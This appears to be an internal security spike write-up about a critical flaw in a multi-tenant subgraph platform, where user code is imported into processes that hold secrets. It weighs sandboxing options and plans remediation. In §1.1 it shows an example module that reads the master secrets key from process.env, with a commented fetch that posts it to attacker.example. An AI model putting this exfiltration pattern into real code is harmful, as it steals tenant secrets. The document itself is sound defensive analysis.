# Spike f049 — Isolate untrusted subgraph code out of privileged processes

- **Finding**: f049 (P1 severity / L effort / HIGH rollout risk), planned at `cffef3b4`, 2026-07-04.
- **Status of this doc**: SPIKE deliverable. Design + PoC only. **No production import site is changed.** Founder go/no-go required before any implementation plan is scheduled.
- **PoC**: `spike/` (unmerged) — `spike/poc.ts`, `spike/malicious-subgraph.ts`. Run: `bun run spike/poc.ts`.

> **Live-risk banner**: until this is fixed, treat "any authenticated account can run arbitrary code in a process holding `SECONDLAYER_SECRETS_KEY`, the managed `DATABASE_URL`, and Stripe keys" as a known, unmitigated, multi-tenant compromise. This is the highest-severity item in the audit.

---

## 1. Threat model

### 1.1 The mechanism

User-submitted subgraph TypeScript is turned into a runnable ES module and `import()`-ed into privileged Node/Bun processes. `import()` executes the module's **top-level code** before any validation runs and before any handler is called. There is no `vm` / `isolated-vm` / worker / microVM boundary anywhere in the path. The only transform applied is an esbuild bundle whose sole plugin (`packages/bundler/src/stub-plugin.ts`) rewrites `@secondlayer/subgraphs` to a one-line stub; **Node builtins (`node:fs`, `node:child_process`, `process`, `process.env`, `fetch`) are left external** (`platform: "node"`) and resolve against the host process at import time.

So a subgraph author writes, at module top level:

```ts
import { appendFileSync } from "node:fs";
const stolen = process.env.SECONDLAYER_SECRETS_KEY;   // master AES key
// fetch("https://attacker.example/collect", { method: "POST", body: stolen })
```

…and it runs, with full ambient authority, the moment the module is imported. This is reproduced end-to-end by the PoC (§7): the fixture `spike/malicious-subgraph.ts` is a *valid* subgraph (`defineSubgraph({...})` with real `name`/`sources`/`schema`) whose top-level side effect exfiltrates the (fake) key. It fired on **every** import call in the PoC.

### 1.2 The three import sites (verified present at dispatch)

| # | Site | File:line | Trigger | Frequency | Process & secrets in blast radius |
|---|------|-----------|---------|-----------|-----------------------------------|
| 1 | Bundle-time definition extraction | `packages/bundler/src/subgraph.ts:64` | `POST /api/subgraphs/bundle` (`routes/subgraphs.ts:874`), any authenticated account | Once per bundle (interactive authoring loop) | **API process** — `SECONDLAYER_SECRETS_KEY`, managed `DATABASE_URL`, Stripe |
| 2 | Deploy-time definition extraction | `packages/api/src/routes/subgraphs.ts:397` | deploy route, any authenticated account | Once per deploy | **API process** — same secrets as site 1 |
| 3 | Per-block handler load | `packages/subgraphs/src/runtime/processor.ts:128` | shared processor loads `sg.handler_code` from DB, imports it | Once per (subgraph, version); handlers then run **every block** | **Shared processor** — decrypts every tenant's BYO DB connection string via `SECONDLAYER_SECRETS_KEY`; holds managed `DATABASE_URL` |

Drift check at dispatch (`grep -rn "await import(pathToFileURL" packages/`) confirmed sites 1 and 2 verbatim; site 3 uses `handlerImportUrl(...)` (a `pathToFileURL(...).href + "?t="` cache-buster) at `processor.ts:128`. Plan cited `routes/subgraphs.ts:392`; actual is `:397` (5-line drift, same code).

### 1.3 What the master key protects

`packages/shared/src/crypto/secrets.ts`: `SECONDLAYER_SECRETS_KEY` is a 32-byte AES-256-GCM master key. `decryptSecret()` uses it to unseal **every tenant's** at-rest secrets — the BYO database connection strings and subscription signing secrets. One read of this env var = the ability to decrypt every envelope in the DB = full cross-tenant data-plane compromise. Stripe keys in the same process extend blast radius to billing.

### 1.4 Blast radius summary

- **Sites 1 & 2 (API process)**: any *authenticated* account (no deploy needed for site 1 — bundling alone executes code) → master key + managed DB + Stripe → **exfiltrate all tenant secrets**.
- **Site 3 (shared processor)**: the process that reaches across tenants to decrypt BYO connection strings; code runs per block, so an attacker also gets a *persistent* foothold (re-runs every version reload), not just a one-shot.
- The Docker container is the thing being *escaped from*, not a mitigation. Network egress controls (if any) are the only thing standing between a read and an exfil; do not rely on them.

### 1.5 Attacker capability, per site

Anything the process can do: read env, read/write the filesystem (including other tenants' handler files under `DATA_DIR`), open sockets to the managed DB and to the internet, spawn child processes, and — at site 3 — sit in the hot path of every tenant's indexing. Top-level side effects need no handler to ever fire; validation runs *after* import, far too late.

---

## 2. Options analysis

Scored 1–5 (5 = best) on **isolation strength**, **per-block latency/throughput cost**, low **operational complexity**, and **Bun compatibility**.

### Option A — `isolated-vm` (V8 isolate, no Node builtins, explicit capability object)

Run user code in a fresh V8 isolate with **no** ambient `process`, `require`, or Node builtins; pass a hand-built `ctx` reference in. Strong, well-understood boundary; the isolate has no filesystem/network/env unless you hand it a bridge.

- Isolation: **5** (separate heap, no host globals by construction).
- Per-block cost: **2–3** — marshalling across the isolate boundary on every `ctx.insert/upsert/findOne` is non-trivial; a warm per-tenant isolate pool is mandatory. Copy semantics on the membrane add per-call overhead the current in-process `SubgraphContext` doesn't pay.
- Ops complexity: **2** — native addon, must match Node ABI; another moving part to build/patch per Node upgrade.
- **Bun compat: 1 (blocker)** — `isolated-vm` is a Node native addon built against V8/N-API; it is **not** supported under Bun (JSC, not V8). Adopting it forces the affected process onto a **Node** runtime. The processor (site 3) currently relies on `Bun.*` APIs and Bun's `import()` cache semantics (see the `?t=` cache-buster note and the `mkdtemp`-freshness comment). Moving it to Node is itself a migration.

### Option B — Per-tenant sandboxed **worker** with a locked-down module resolver

Run handlers in a `worker_threads` Worker (Node) / `Worker` (Bun) whose module loader **drops `node:*` builtins** and injects no ambient `process.env`; the only capability is a message-passed `ctx` proxy. Weaker than a V8 isolate (a worker shares the same runtime, and a determined escape via a resolver gap or a prototype-pollution gadget is more plausible) but a real process/thread boundary with no secrets in its env.

- Isolation: **3–4** — real boundary + scrubbed env; strength depends entirely on the resolver being airtight and the worker's env being empty of secrets.
- Per-block cost: **3** — a warm per-tenant worker pool amortizes spawn; `ctx` ops become async message round-trips (batchable per block, which fits the existing flush-at-end-of-block model in `context.ts`).
- Ops complexity: **3** — pooling, lifecycle, crash recovery, backpressure.
- **Bun compat: 4** — Bun supports `Worker`; the module-resolver lockdown is the hard part but is runtime-agnostic. Keeps the processor on Bun.

### Option C — Out-of-process microVM (Firecracker / **Vercel Sandbox**)

Run the untrusted step in an ephemeral microVM. The repo already lives in a Vercel context (the stub plugin exists specifically because `process.cwd()` has no `node_modules` in Vercel serverless), and **Vercel Sandbox** is purpose-built for "run untrusted/AI-generated code in an ephemeral Firecracker microVM."

- Isolation: **5** — hardware-virt boundary; the strongest option.
- Per-block cost: **1** — microVM cold/warm start (tens–hundreds of ms) is disqualifying for the *per-block* path. Viable only for run-once sites (bundle/deploy) or a batch/reindex path.
- Ops complexity: **3–4** — managed if Vercel Sandbox; self-hosted Firecracker is a lot.
- Bun compat: **5** (irrelevant — separate VM, runtime of the host process doesn't matter).
- **Best fit**: sites 1 & 2 (extraction) and possibly a bulk reindex, **not** the per-block hot path.

### Option D — Static-analysis-only extraction (parse the AST, never execute)

For the **definition-extraction** sites (1 & 2) we do not actually need to *run* user code — we need `name` / `version` / `description` / `sources` / `schema`, which are declarative object/string/array literals inside a single `defineSubgraph({...})` call. `defineSubgraph` is a pure identity function (`packages/subgraphs/src/define.ts:60`) and the stub proves the runtime already treats it as one. So we can parse the TypeScript with the compiler API, locate the `defineSubgraph({...})` call, and statically read those literals **without executing a line of user code**. `handlers` (the only function-valued field) is *not* needed to produce the metadata — it is kept as opaque bundled source and only matters at the per-block execution site.

- Isolation: **5** for what it covers — there is no code execution at all, so there is nothing to escape.
- Per-block cost: **n/a** — this option does not apply to site 3 (handlers must execute).
- Ops complexity: **5** — pure library code (`typescript` is already a dependency); no native addons, no pools, no VMs.
- Bun compat: **5** — the TypeScript compiler API runs fine under Bun (PoC confirms).
- **Limitation**: only covers the *metadata* sites. It also imposes a real constraint — the definition must be statically analyzable (literal `sources`/`schema`, a single top-level `defineSubgraph` call). That is already the documented, idiomatic shape (`define.ts` docblock), but any author computing `sources` dynamically at module scope would be rejected. That rejection is a *feature* (it is exactly the code we refuse to run), but it must be a documented, well-errored contract.

---

## 3. Recommended target architecture

**Principle: never `import()` user code into the API process or the shared processor. Pass an explicit `ctx` capability object. No ambient secrets in any process that touches user code.**

Decide **per site** — the sites do not have the same needs:

- **Sites 1 & 2 (bundle/deploy definition extraction) → Option D (AST-only).** These sites only need declarative metadata. AST extraction removes code execution from the API process entirely — the single highest-severity path — with a library-only change and no runtime/ops cost. The PoC (§7) shows it produces identical `name`/`sources`/`schema` while the secret read never fires. **This may fully close sites 1 & 2** (see the open-question answer in §6.1), which would down-scope the whole effort — a valuable finding on its own.
- **Site 3 (per-block handler execution) → Option B (warm per-tenant worker pool) as the primary target, with Option A/isolated-vm as the fallback if worker isolation proves insufficient under review.** Handlers must run real code, so this site genuinely needs a sandbox. The target is:
  - The processor process holds **no** `SECONDLAYER_SECRETS_KEY`. Decryption of a tenant's BYO connection string happens in a separate privileged component; the worker running that tenant's handler receives only an already-scoped DB handle / a `ctx` proxy — never the master key or another tenant's anything.
  - The worker's environment is scrubbed (no `process.env` secrets), `node:*` builtins are dropped by the loader, and the **only** capability handed in is the `ctx` message proxy.
  - Handler `ctx` operations are already batched and flushed at end-of-block (`SubgraphContext` in `context.ts`), which maps cleanly onto per-block message batching across the worker boundary.

**Does today's `ctx` already form a clean capability boundary?** Partially in *shape*, not in *enforcement*. `SubgraphContext` (`context.ts`) is a narrow surface — `insert/upsert/increment/findOne/findMany/count/...` over a bound transaction — and handlers are invoked as `handler(event, ctx)` (`runner.ts:421`). If handlers could *only* see `ctx`, that would be a decent capability. But because the handler runs in-process it also sees `process`, `globalThis`, `fetch`, `require`, and every Node builtin — so `ctx` is a *convenience API today, not a security boundary*. The target architecture is what makes `ctx` the *sole* capability. Note `ctx` also wraps the live DB transaction directly; when it moves behind a worker membrane, the transaction stays host-side and only serialized ops cross.

---

## 4. Migration path (staged, with rollback)

Ordered by risk-adjusted leverage: close the highest-severity, lowest-QPS sites first with the cheapest mechanism, then take on the hot path.

**Stage 0 — Contain (now, no code):** rotate secrets (§8), and treat the vuln as live in every security review. If feasible operationally, restrict outbound egress from the API and processor processes as a stopgap (defense-in-depth only; not a fix).

**Stage 1 — AST-only for sites 1 & 2 (low risk, high value):** replace `bundleSubgraphCode`'s bundle-then-`import()` and the deploy route's `import()` with AST extraction of the `defineSubgraph({...})` literal. Keep esbuild bundling of `handlerCode` for storage/shipping to the processor, but **stop executing it** to read metadata. Validate the extracted definition with the existing `validateSubgraphDefinition`. Ship behind a flag that can fall back to the old path.
- *Rollback*: flag flip to the legacy `import()` path. Because Stage 1 is additive (new extractor, old path retained behind a flag), rollback is instant and carries no schema/data change.
- *New contract*: reject non-statically-analyzable definitions with a clear error; document that `sources`/`schema` must be literals (already the idiomatic shape).

**Stage 2 — Sandbox site 3 (higher risk, the hot path):** introduce the warm per-tenant worker pool, move `SECONDLAYER_SECRETS_KEY` out of the processor, and route handler execution through the `ctx` membrane. Land dark (shadow-run against a subset of subgraphs, compare flush manifests) before cutting over. This is a *separate implementation plan* with its own risk review — it touches the per-block hot path and the reorg/flush transaction structure.
- *Rollback*: per-subgraph or global flag back to in-process execution; requires the processor to still be *able* to hold the key during the transition (so key removal is the last step, after the sandbox is proven).

**Stage 3 — Decommission the legacy in-process path** once Stage 2 is proven at full traffic, and remove the master key from any process that ever touches user code.

---

## 5. Proof-of-concept (unmerged, in `spike/`)

The PoC targets the lowest-risk site — **bundle-time definition extraction (site 1)** — and demonstrates Option D against the live behaviour. Files:

- `spike/malicious-subgraph.ts` — a valid subgraph whose top-level side effect reads `process.env.SECONDLAYER_SECRETS_KEY` and writes it to a canary file (stands in for an exfil POST).
- `spike/poc.ts` — runs two paths over the *same* source and checks the canary:
  - **PATH A (execute)** mirrors `subgraph.ts`: esbuild-bundle (with the production stub plugin) → write temp → `import()`. 
  - **PATH B (AST-extract)** parses with the `typescript` compiler API, finds the `defineSubgraph({...})` call, and statically evaluates the `name`/`sources`/`schema` literals — refusing any non-literal expression and skipping `handlers`.

### Measured result (Bun 1.3.10, macOS; 20 warm iterations, median)

| Path | Extracted `name` | Secret exfiltrated? | Median latency |
|------|------------------|---------------------|----------------|
| A — execute (current) | `totally-legit-token-index` | **YES — leaked on every call** | 1.28 ms |
| B — AST-extract (proposed) | `totally-legit-token-index` | **No — blocked** | 0.26 ms |

Both paths produce identical metadata (`name`, `sources: {transfer}`, `schema: {transfers}`). Path A wrote the (fake) key to the canary on all 21 imports — confirming *each* `import()` re-executes top-level user code, consistent with the unique-`mkdtemp`-path freshness the production code relies on. Path B never fires the canary.

**On the latency number — read this honestly.** The 1.02 ms delta is *warm, small-module, single-machine*, and is **not** the headline. esbuild was already warmed and the fixture is tiny; in production the execute path's real cost is dominated by esbuild bundling, which Stage 1 *keeps* (for shipping `handlerCode`) regardless. The load-bearing result is the **security** column, not the millisecond column: AST extraction yields the same metadata with **zero code execution**, so the delta that matters is "arbitrary code runs in the API process" → "no code runs." The latency figure is real and measured, but do not size the decision on it.

Reproduce: `bun run spike/poc.ts`.

---

## 6. Open questions — answered

### 6.1 Can sites 1 & 2 avoid executing user code entirely via AST reading?

**Yes, for the idiomatic definition shape — and the PoC proves it.** `defineSubgraph` is a pure identity function; `name`/`version`/`description`/`sources`/`schema` are declarative literals; `handlers` (the only functions) are not needed to produce metadata. AST extraction reads all of it without execution. Caveat: it *requires* the definition be statically analyzable (single top-level `defineSubgraph` call, literal `sources`/`schema`). That is already the documented shape, but it becomes an enforced contract — authors who compute the definition dynamically at module scope are rejected (which is the whole point). **If we accept this contract, sites 1 & 2 need no isolate at all — this down-scopes the effort to just the per-block path.**

### 6.2 Per-block latency budget for the processor — does `isolated-vm` fit, or is a warm pool required?

A warm per-tenant pool is required *regardless* of mechanism — the current design flushes ctx ops at end-of-block (`context.ts`), so per-block handler execution is on the critical indexing path and cannot absorb per-block cold starts. `isolated-vm`'s per-op membrane marshalling makes a warm isolate mandatory, and its **Bun incompatibility (§2.A) is the deciding constraint**: adopting it forces the processor onto Node. A warm **worker** pool (Option B) keeps Bun and fits the batched-flush model. Exact budget (ms/block at tip and during reindex) must be measured against a representative subgraph before Stage 2 — flagged as a required pre-Stage-2 benchmark; not measured in this spike.

### 6.3 Does the current handler `ctx` form a clean capability boundary, or leak ambient access?

Clean in *shape*, not in *enforcement* — see §3. `SubgraphContext` is a narrow API, but because handlers run in-process they also see `process.env`, `fetch`, `require`, and all Node builtins. `ctx` is a convenience API today, not a security boundary; the target architecture makes it the *sole* capability by removing ambient access.

### 6.4 Bun vs Node: is `isolated-vm` usable under Bun in production?

**No.** `isolated-vm` is a V8/N-API native addon; Bun is JSC-based and does not support it. Choosing `isolated-vm` means running the processor under Node. This is the primary reason the recommendation is **Option B (worker) for site 3**, which preserves the Bun runtime the processor currently depends on.

---

## 7. Secret-rotation checklist (remediation, founder-operated)

Because the vulnerability is **live** and any authenticated account could already have read these, remediation must include rotation. **Do not treat rotation as optional or deferred.** Per the rotation strategy documented in `packages/shared/src/crypto/secrets.ts` (lines 25–28: "re-encrypt all rows with the new key and swap the env var"):

- [ ] **Rotate `SECONDLAYER_SECRETS_KEY`.** This is not a simple env swap: every at-rest envelope (`iv || authTag || ciphertext`, per `secrets.ts`) — every tenant BYO connection string and subscription signing secret — must be **decrypted with the old key and re-encrypted with the new key**. Plan for the documented "not zero-downtime" re-encryption window.
- [ ] **Rotate Stripe keys** (present in the same process).
- [ ] **Rotate the managed `DATABASE_URL` credentials** (also exposed).
- [ ] Rotate any subscription signing secrets not covered by the envelope re-encryption.
- [ ] Consider that rotation is *containment, not proof* — it does not tell you whether exfil already happened. Pair with an egress/access-log review if available.
- [ ] Rotation is a **founder operation** — this spike does **not** perform it. (Longer term, the `secrets.ts` docblock's suggested KMS interface — `EncryptSecret`/`DecryptSecret` behind AWS/GCP KMS or Vault — would make future rotation and blast-radius containment far cheaper.)

---

## 8. Go / no-go recommendation

**GO — staged, founder-approved.** Concretely:

1. **Approve Stage 1 (AST-only for sites 1 & 2) as a standalone implementation plan now.** It is library-only (`typescript` already a dep), Bun-native, flag-guarded, instantly reversible, and removes arbitrary code execution from the API process — the highest-severity path — with negligible ops cost. The PoC demonstrates feasibility. This likely closes sites 1 & 2 entirely (§6.1).
2. **Schedule Stage 2 (worker sandbox for site 3) as a separate, risk-reviewed plan** gated on (a) a per-block latency benchmark (§6.2) and (b) sign-off that a scrubbed-env worker + locked-down resolver is sufficient isolation for the threat model, with `isolated-vm`-on-Node as the fallback if not. Do **not** bundle Stage 2 into Stage 1 — it touches the per-block hot path and the flush/reorg transaction structure.
3. **Execute the rotation checklist (§7) as part of remediation, independent of code timeline** — the exposure is live now.

**No-go conditions to watch:** if enforcing the static-analyzability contract (§6.1) turns out to reject a meaningful fraction of real deployed subgraphs, Stage 1 needs a compatibility path (e.g. AST-extract with a fallback to a *sandboxed* execute for non-analyzable definitions) before it can ship — surface that with a survey of existing `handler_code` before implementation.

---

## 9. Related / notes

- **f045** (DDL injection on `relations[].name`) is defense-in-depth for a *different* path (the schema DDL generator) and should land regardless of this spike's timeline.
- This finding gates trust in the entire multi-tenant model. Until Stage 1+2 land and the key is rotated, "any authenticated account can run code in our secret-holding processes" is a known, live risk.
- **Out of scope for this spike (not done here):** no production import site was modified; no secret was rotated; the per-block latency benchmark was not run. All three are called out above as founder/next-plan actions.
